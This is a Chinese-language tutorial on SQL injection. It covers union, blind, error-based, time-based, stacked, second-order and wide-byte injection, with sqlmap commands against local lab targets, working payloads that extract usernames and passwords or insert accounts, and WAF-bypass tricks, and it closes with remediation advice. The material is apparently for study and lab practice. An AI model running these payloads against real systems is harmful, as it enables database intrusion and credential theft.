## SQL注入漏洞

Web程序代码中，因为有些操作数据库的代码，直接使用了用户输入的字符，导致查询语句打破了操作语句原有的逻辑，结果黑客能使用漏洞来执行任意数据库语句，如查找数据、下载数据、写入webshell、执行系统命令、绕过登录。



### 1. SQL注入原理

SQL注入漏洞需要满足两个条件：

- 参数用户可控： 从前端传给后端你的参数内容是用户可以控制的
- 参数代入数据库查询：传入的参数会拼接到查询语句，带入到数据库去查询



##### 判断是否存在注入

回显是指页面有数据 信息返回

无回显是指根据输入的语句，页面没有任何变化，或者没有数据库中的内容显示到网页中



### 2. 注入流程



### 3. SQL注入分类

- UNION query SQL injection（可联合查询注入）
- Stacked queries SQL injection（可多语句查询注入） 堆叠查询
- Boolean-based blind SQL injection（布尔型注入）
- Error-based SQL injection（报错型注入）
- TIme-based blind SQL injection（基于时间延迟注入）



### 4. SQL注入常规思路

1. 寻找注入点，可以通过`sqlmap`工具实现
2. 通过注入点，尝试获取数据用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息
3. 猜解关键数据库及其重要字段与内容（常见如存放管理员账户的表明、字段等），还可以获取数据库的root账号密码
4. 可以通过获取用户信息，寻找后台登录
5. 利用后台了解进一步信息



#### 4.1. 使用sqlmap注入，依照请求类型分类

##### 4.1.1. get请求

由于请求内容是直接拼接在url后面，因此在使用sqlmap的时候，可以直接使用进行注入

```shell
sqlmap -u "url" -p 参数名 
```

##### 4.1.2 post请求

- ###### 方式1： 

由于请求内容一般存在请求体内，因此可以使用`burpsuite`对请求进行截取，然后通过使用**--dbs,-D,-T,-C获取库名，指定数据库，指定表名，指定列名**

```shell
sqlmap -r "文件路径" -p 参数名 (-- dbs 获取所有数据库 ) (-D 指定库名 -- tables 获取所有表) (-T 表明 --columns获取所有列明) (-C "列名，拼接" --dump破解所有行数据)
```

-  ###### 方式2：

使用自动表单,会自动发起一个请求帮你找到body中需要传递的参数

```shell
sqlmap -u " url" --forms
```

- ###### 方式3

自定指定body中参数内容，需要自己在字符串中拼接

```shell
sqlmap -u "url" --data "id=1&submit=1"
```







### 5. SQL手工注入过程

1. 判断是否存在注入，判断注入类型
2. 使用`order by`猜解SQL语句的字段数
3. 获取当前数据库、表、字段名
4. 查询数据库中的账户信息



#### 5.1 联合查询注入

联合查询注入是联合两个表进行注入攻击，使用关键字`union select`对两个表进行联合查询。两个表的字段数要相同。

猜出查询表的字段名，然后使用一些函数，或者函数拼接，拼接到联合查询语句中，达到对数据库的查询。一般的函数有`version()`,`database()`,`user()`,`group_concat()`



###### Information_schema表

这个表有`columns`,`tables`,`SCHEMATA`字段中，能查询到库名、表名，和字段名。



#### 5.2 盲注入

查询结果无论对错，都不会将数据库返回信息直接展示到页面上，而是将if-else语句展示到页面上。

盲注入的方式有两种：

- 布尔型盲注入
- 延时注入



##### 5.2.1 布尔型盲注入

对于那些只能进行盲注入的网页，由于输入内容的改变只会造成页面UI的不一样，但是无法直接通过拼接数据库查询语句返回有消息。因此在处理盲注入的时候，通过拼接`select if(1=1,1,0)`这种判断语句，转换成自己想要知道的信息的比较，从真值中获得自己想要的信息。



1. ###### 布尔型盲注入获取数据库敏感信息

基于布尔盲注的原理，可以构造获取数据库信息的时候，根据全字符或部分字符进行判断，从而获取数据的敏感信息。

如：

```	sql
select if(substring(database(),1,1)='d',1,0)
```



2. ###### 黑盒模式下布尔型注入

步骤：

- 首先判断注入
- 获取数据库长度，得到长度后，通过部分截取字符比较，得到每个字符，具体操作使用burpsuite的`Cluster boomb`模式，其实也是可以自己写脚本来进行循环判断字符。
- 同样的思路去查询表
- 最后指定查询表中的数据

一般进行判断比较字符库：

```shell
a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_"
```



1. 获取库名

```sql
1' and if(substring(database(),1,1)='d',1,0)--+
```

2. 获取表名

```sql
1'and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)='g',1,0)--+
```

3. 获取列名

```sql
1'and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1,1),1,1)='u',1,0)--+
```

4. 获取每一行数据

```sql
# 首先判断查询账号和密码的长度
1'and if((SELECT LENGTH(CONCAT(user,0x3a,PASSWORD)) from users limit 1)=38,1,0)--+
```

```sql
# 获取账号密码
1'and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)='a',1,0)--+
```



### 6. 报错注入

要点：当页面无回显且在输入错误信息的时候，能返回报错信息。一般这些报错信息是函数执行`mysqli_error(),mysqli_connect_error()`将错误信息返回到页面上。



注入报错的分类：

- BIGINT等数据类型溢出
- xpath语法错误，适用版本：mysql版本号大于5.1.5
- floor()报错
- 列名重复报错
- 参数不规范报错



#### 6.1 常用报错注入函数



##### 6.1.1 floor

```sql
(select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

使用了`count(),rand(),floor(),group by`这几个函数。

`rand()`会随机生成范围内的值，这里`rand(0`)会生成0~1的值，`rand(0)*2`就是0~2的值，然后带上`floor()`，就是0或1，但是这个0，1生成的顺序会和rand()函数调用有关系。

特别注意的地方是`group by`这个里，会使用`x`作为主键，**意思是不存在的时候先新建一行，存在的时候就会调用count()的计数加一**。然后由于`floor(rand(0)\*2)`作为主键，**在判断是否存在主键的时候会先计算值一次，然后在使用的时候又会再计算一次，因此会造成判断值和插入值不一样**，出现的问题就是，当前可能表中已经存在主键“XXX1”，此次判断是否需要插入的键为“XXX0”，于是需要插入，但是插入时重新计算了值“XXX1”，就会造成主键重复插入的错误,由于此特性，也需要查询内容数量要至少3条。

- 爆破用户信息

```sql
and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

- 爆破库

```sql
and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

- 爆破表名

```sql
and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

- 爆破字段名

```sql
and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

- 爆破数据

```sql
and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);
```



##### 6.1.2 updatexml

```sql
and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

```

函数报错原因:

因为函数插入参数的时候，使用了`~`,`^`的ASCII编码，分别为`0x7e`,`0x5e`，这类特殊字符在使用这些函数的时候都是非法的，因此会产生报错信息。而在报错的是哦户，SQL的解析器会自动解析SQL语句，然后造成SQL语句的执行。



##### 6.1.3. extractvalue

```sql
and (extractvalue(1,concat(0x7e,(select user()),0x7e)));	
```

第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式。如果我们写入其他格式，就会报错。并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错。原理和`updatexml`一样。



##### 6.1.4. exp 

**适用版本：mysql5.5.44-5.5.47.**

`exp`是以e为底的指数函数，但是太大会溢出。`exp(709)`会产生溢出，报错。

```sql
and exp(~(select * from (select database())a));
```



##### 6.1.5. multipoint

**适用版本：mysql版本号在5.5.44 - 5.7.17**

mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。



```sql
and multipoint ((select * from(select * from (select version())a)b);
```







#### 6.2 报错注入的缺陷和解决方法

- 报错注入的回显内容，一般只有32位长度的字符串，这时候我们可以字符串截断函数截断查询的SQL语句来回显32位后面的内容，常用的字符串截断函数有`left`,`right`,`mid`,`substr`等等。
- burpsuite中错误注入，正常遍历的时候返回的请求都是正常的无法获取到有用信息，因此可以使用`Options`中的`Grep-Extract`中，过滤掉响应中自己想要的信息。



### 7. SQL注入进阶

实验基于`sqli-labs`,使用docker环境

```shell
# 启动
sudo docker run -dt --name sqli -p 7766:80 acgpiano/sqli-labs
# 进入容器
sudo docker exec -ti sqli /bin/bash
```



#### 7.1 时间注入

时间注入又名延时注入，输入盲注入的一种，通常是某个注入点无法通过布尔型注入获取数据而采用一种突破注入的技巧。

主要使用到`sleep()`,`if()`,`sbustring()`

```sql
select if(2>1,sleep(10),0);
select if(length(database())>1,sleep(5),0);
```



##### 7.1.1 使用SQLMap进行注入

使用`--technique=T`指定注入方式为时间注入

- 获取当前库，当前用户

```shell
sqlmap -u "http://192.168.0.109/06/vul/sqli/sqli_str.php?name=vince&submit=%E6%9F%A5%E8%AF%A2" -p name --technique=T --current-user --current-db --batch
```

- 获取表

   -D 指定数据库  --tables 获取表

```shell
sqlmap -u "http://192.168.0.109/06/vul/sqli/sqli_str.php?name=vince&submit=%E6%9F%A5%E8%AF%A2~" -p name --technique=T --tables -D pikachu --batch	
```

- 获取列名

  --columns 获取字典 -T 某个表

```shell
sqlmap -u "http://192.168.0.109/06/vul/sqli/sqli_str.php?name=vince&submit=%E6%9F%A5%E8%AF%A2~" -p name --technique=T -D pikachu -T users --columns --batch
```

- 查询每行数据

  -C 指定查询字段 --dump 导出数据

```shell
sqlmap -u "http://192.168.0.109/06/vul/sqli/sqli_str.php?name=vince&submit=%E6%9F%A5%E8%AF%A2~" -p name --technique=T -D pikachu -T users -C "id,username,password" -v 1 --dump --batch
```





#### 7.2 堆叠查询

##### 7.2.1 堆叠查询的原理

堆叠查询可以执行多条 SQL 语句，语句之间以分号(;)隔开，而堆叠 查询注入攻击就是利用此特点，在第二条语句中构造要执行攻击的语句。

在 mysql 里 `mysqli_multi_query` 和 `mysql_multi_query `这两个函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。 但是堆叠查询只能返回第一条查询信息，不返回后面的信息。

select version();select database()

堆叠注入的危害是很大的 可以任意使用增删改查的语句，例如删除数据库 修改 数据库，添加数据库用户。

由于sql函数执行的时候是`mysqli_multi_query(param1,param2)`，因此注入的时候只需要将字符串注入截断，改成使用`;`，冒号后拼接后面的sql语句即可。

```sql
id=-999';insert into users(id,username,password)values(1000,'moonsec','123456')--+
```

插入信息的时候，可以使用sql查询语句作为参数输入

```sql
id=-999';insert into users(id,username,password)values(1000,(select version()),'123456')--+
```



#### 7.3 二次注入攻击

##### 7.3.1 二次注入的原理

在使用数据库语句进行操作的时候，在首次使用`addslashed`或者`get_magic_quotes_gpc`对特殊字符进行了转移，但是在字符插入数据库的时候，并没有将转义字符也一起写入到数据库中。因此，在下一次读取这部分数据的时候，没有进行对这部分数据进行转义，从而造成了注入。



##### 7.3.2  黑盒环境下进行二次注入测试

一般二次注入的功能点，用户注册->修改密码，邮箱注册->修改密码，文章添加->文章修改。

二次注入测试 SQL 注入，二次注入多数是字符型注入，所以要注意闭合问题。

基于`sql-lib/Lesson-24`

使用用户a,123456和a' and 1=1#,123456,对a' and 1=1#进行密码修改。



#### 7.3 宽字节注入

原理就是后台编码和数据库中的编码不匹配，在这过程中，经过一些转义函数之后，在进入到数据库编码的时候，会改变原来的语义。

如：%df%27===(addslashes转义后)===>%df%5c%27===(数据库 GBK)===>運'

垃圾暗月不知道说了啥。哦是这样，哦不是这样。。讲课？还是试错？？





#### 7.4 COOKIE注入

COOKIE 注入与 GET、POST 注入区别不大，只是传递的方式不一样。GET 再

url 传递参数、POST 在 POST 正文传递参数和值，COOKIE 在 cookie 头传值。

cookie一般都放在请求头，所以直接在浏览器上操作不方便，使用`brupsuite`截获请求，然后进行重发操作，并且带上`cookie`字段即可。



#### 7.5 base64编码注入

base64编码后的字符串，会使特殊字符绕过一些拦截。如果代码中的逻辑是，使用base64编码的数据进行传输，但是用的时候又将内容base64解码后去使用，会导致绕过拦截。







### 8.  SQL注入绕过

不错的总结[SQL注入之WAF绕过注入](https://yuanshisen.com/WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/index.html)

基于不同层面进行绕过总结：

#### 8.1 应用层

##### 8.1.1 大小写、关键字替换

```markdown
id=1 UnIoN/**/SeLeCT 1,user()Hex() bin() 等价于ascii()
Sleep() 等价于benchmark()
Mid()substring() 等价于 substr()
@@user 等价于  User()
@@Version 等价于 version()
```



##### 8.1.2 各种编码

- 大小写
- URL编码
- HEX（十六进制）
- %0A（换行）等



##### 8.1.3 注释使用

```sql
// , -- , --+, #, /**/ , + , :%00, /!**/等，可以混用	
```



##### 8.1.4 双写

```markdown
union==uunionnion //当waf或者后端对某些关键字进行过滤时,可以尝试双写，过滤规则过滤掉中间的union后，剩下一个union，前提是目标站点需要存在过滤才可以利用
```



##### 8.1.5 等价替换

某些敏感函数可能存在无法绕过war的情况，那么可以想方法使用拥有相同功能的函数或者符号代替。

- user() = @@user()
- and = &
- or = |
- ascii=hex等



##### 8.1.6 HTTP参数污染

```http
?id=1&id=2&id=3	
```



##### 8.1.7 编码解密及加密解密

```markdown
s -> %73 -> %25%37%33
//hex,urlencode,base64等
```



##### 8.1.8 更改请求方式

- GET，POST，COOKIE等
- post请求分块拼接

参考链接：

[1](https://www.cnblogs.com/tylerdonet/p/5722858.html)

[2](https://blog.csdn.net/qq_33706382/article/details/78168325)



##### 8.1.9 中间件HPP参数污染



##### 8.1.10 数据库技巧

###### 1、Mysql技巧

（1）mysql注释符有三种：#、/*…*/、– … (注意–后面有一个空格)

（2）空格符:[0x09,0x0a-0x0d,0x20,0xa0]

（3）特殊符号：%a 换行符

可结合注释符使用%23%0a，%2d%2d%0a。

（3）内联注释：

/*!UnIon12345SelEcT*/ 1,user() //数字范围 1000-50540

（4）mysql黑魔法

select{x username}from {x11 test.admin};

###### 2、SQL Server技巧

（1）用来注释掉注射后查询的其余部分：

/* C语言风格注释

– SQL注释

; 00％ 空字节

（2）空白符：[0x01-0x20]

（3）特殊符号：%3a 冒号

id=1 union:select 1,2 from:admin

（4）函数变形：如db_name[空白字符](https://yuanshisen.com/WEB漏洞-SQL注入之堆叠及WAF绕过注入/index.html)

###### 3、Oracle技巧

（1）注释符：–、/**/

（2）空白字符：[0x00,0x09，0x0a-0x0d,0x20]



##### 8.1.11 配合FUZZ

```sql
select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】from【位置五】admin
```



#### 8.2 逻辑层

##### 8.2.1 逻辑问题



### 9. 文件上传漏洞







### 修复建议

 代码层最佳防御 sql 漏洞方案:采用 sql 语句`预编译`和`绑定变量`，是防御 sql 注入的最佳方法。

( 1 ) 所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使 **用参数而不是将用户输入变量嵌入到 SQL 语句中**。当前几乎所有的数据库系统 都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注 入攻击。

( 2 ) 对进入数据库的特殊字符( ' <>&*; 等)进行转义处理，或编码转换。 

( 3 ) 确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。

( 4 ) 数据长度应该严格规定，能在一定程度上防止比较长的 SQL 注入语句 无法正确执行。

( 5 ) 网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码 不一致有可能导致一些过滤模型被绕过。

( 6 ) 严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其 工作的权限，从而最大限度的减少注入攻击

对数据库的危害。

( 7 ) 避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻 击者利用这些错误信息进行一些判断。	